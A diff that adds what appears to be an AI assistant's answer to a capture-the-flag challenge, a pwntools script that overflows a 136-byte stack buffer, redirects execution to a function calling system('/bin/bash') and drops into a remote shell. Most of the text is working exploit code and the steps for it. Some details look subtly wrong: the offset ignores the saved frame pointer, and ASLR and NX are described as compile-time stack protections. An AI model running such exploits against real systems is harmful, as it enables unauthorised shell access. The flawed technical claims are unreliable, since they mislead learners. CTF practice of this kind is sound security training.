@@ -1,0 +1,73 @@
+Certainly! To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` function to gain control over the instruction pointer (EIP) and redirect execution to the `not_called` function, which calls `system("/bin/bash")`.
+
+Here are the steps and the corresponding `pwntools` code to achieve this:
+
+### Steps:
+1. **Identify the Buffer Size and Overflow Point**:
+   - The buffer `buf` in `vulnerable_function` is 136 bytes long.
+   - We need to overflow this buffer to overwrite the return address on the stack.
+
+2. **Find the Address of `not_called` Function**:
+   - The address of the `not_called` function is `0x080484A4`.
+
+3. **Craft the Payload**:
+   - The payload will consist of 136 bytes to fill the buffer, followed by the address of `not_called` to overwrite the return address.
+
+4. **Send the Payload to the Vulnerable Function**:
+   - Use `pwntools` to connect to the service and send the crafted payload.
+
+### Code:
+```python
+from pwn import *
+
+# Set up the target binary
+binary = './vulnerable_binary'
+elf = ELF(binary)
+
+# Find the address of the not_called function
+not_called_addr = elf.symbols['not_called']
+
+# Create a process or connect to a remote service
+# For local testing:
+# p = process(binary)
+
+# For remote connection:
+p = remote('challenge_server', 12345)
+
+# Craft the payload
+payload = b'A' * 136  # Fill the buffer
+payload += p32(not_called_addr)  # Overwrite the return address with the address of not_called
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+1. **Set up the target binary**:
+   - `ELF(binary)` loads the binary and allows us to access symbols and addresses.
+
+2. **Find the address of the `not_called` function**:
+   - `elf.symbols['not_called']` retrieves the address of the `not_called` function.
+
+3. **Create a process or connect to a remote service**:
+   - For local testing, use `process(binary)`.
+   - For remote connections, use `remote('challenge_server', port)`.
+
+4. **Craft the payload**:
+   - `b'A' * 136` fills the buffer with 136 'A' characters.
+   - `p32(not_called_addr)` packs the address of `not_called` into a 32-bit little-endian format.
+
+5. **Send the payload**:
+   - `p.sendline(payload)` sends the crafted payload to the vulnerable function.
+
+6. **Interact with the shell**:
+   - `p.interactive()` allows you to interact with the shell spawned by the `not_called` function.
+
+### Notes:
+- Ensure that the binary is compiled without stack protection mechanisms like ASLR (Address Space Layout Randomization) or NX (Non-Executable Stack) if running locally.
+- If the challenge is running on a remote server, make sure to replace `'challenge_server'` and `12345` with the actual server and port provided by the CTF organizers.
+
+This should give you a working solution to exploit the buffer overflow and gain a shell. Good luck with your CTF challenge!
